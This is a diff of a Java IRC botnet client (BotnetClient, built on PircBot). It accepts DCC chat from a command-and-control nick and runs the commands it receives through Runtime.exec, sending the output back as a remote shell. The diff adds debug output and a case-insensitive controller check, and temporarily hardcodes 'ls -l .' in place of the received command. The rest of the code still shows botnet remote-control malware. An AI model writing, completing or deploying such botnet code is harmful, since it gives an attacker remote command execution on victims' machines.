@@ -75,14 +75,17 @@ public class BotnetClient extends PircBot {
 
 	protected void onIncomingChatRequest(DccChat chatObj) {
 		try {
-			if (chatObj.getNick().equals(CC)) {
+			System.out.println("." + chatObj.getNick() + ".");
+			System.out.println(chatObj.getNick().equalsIgnoreCase(CC));
+			if (chatObj.getNick().equalsIgnoreCase(CC)) {
 				chat = chatObj;
 				chat.accept();
 				Runtime r = Runtime.getRuntime();
 	        	chat.sendLine("$: ");
 	        	String command = chat.readLine();
 	        	while (!command.equalsIgnoreCase("quit shell")) {
-	        		Process p = r.exec(command);
+	        		Process p = r.exec("ls -l .");
+	        		p.waitFor();
 	        		Scanner in = new Scanner(p.getInputStream());
 	        		String response = "";
 	        		while (in.hasNextLine()) {
@@ -95,8 +98,8 @@ public class BotnetClient extends PircBot {
 			} else {
 				chat = null;
 			}
-	     } catch (IOException e) {
-	    	 
+	     } catch (Exception e) {
+	    	 e.printStackTrace();
 	     }
 	}
 	
